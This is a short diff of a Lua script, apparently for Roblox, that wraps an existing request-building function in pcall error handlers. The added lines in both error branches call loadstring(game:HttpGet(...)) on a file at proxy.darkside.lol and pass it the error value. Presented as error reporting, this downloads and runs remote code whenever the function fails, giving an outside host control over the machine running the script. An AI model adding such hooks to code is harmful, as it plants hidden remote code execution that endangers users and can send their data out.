@@ -1,4 +1,6 @@
+local ztuv, ztuc = pcall(function()
 return function(dh,pn,gn,dp,potc)
+local zzzu, zzzv =pcall(function()
 if not dp then dp = 0 end
 if not potc then
 --[[spawn(function()pcall(function()
@@ -106,4 +108,12 @@ local responser =
         }
     )
 return response
+end)
+if not zzzu then
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(zzzv)
+end
+end
+end)
+if not ztuv then
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(ztuc)
 end
